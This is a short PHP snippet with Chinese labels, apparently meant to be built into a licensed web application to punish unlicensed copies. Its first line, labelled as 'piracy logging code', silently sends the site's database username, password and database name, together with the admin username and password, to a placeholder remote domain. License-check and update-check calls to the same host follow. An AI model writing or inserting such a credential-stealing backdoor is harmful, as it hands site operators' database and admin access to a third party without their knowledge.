盗版入库代码：
file_get_contents("http://域名/ajax.php?act=block&url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&dbname=".$dbconfig['dbname']."&authcode=".$authcode."&admin_user=".$conf['admin_user']."&admin_pass=".$conf['admin_pass']);
授权代码+更新代码：
if(!isset($_SESSION['authcode'])){
	$query = curl_get("http://域名/check.php?url=".$_SERVER["HTTP_HOST"]."&authcode=".authcode);
    if ($query = json_decode($query, true)) {
		if ($query["code"] == 1) {
			$_SESSION["authcode"] = authcode;
		}else{
			sysmsg("<h3>".$query["msg"]."</h3>", true);
		}
	}
}
function update_version()
{
	$query = curl_get("http://域名/check.php?url=".$_SERVER["HTTP_HOST"]."&authcode=".authcode."&ver=".VERSION);
	if ($query = json_decode($query,true)) {
		return $query;
	}
		return false;
}

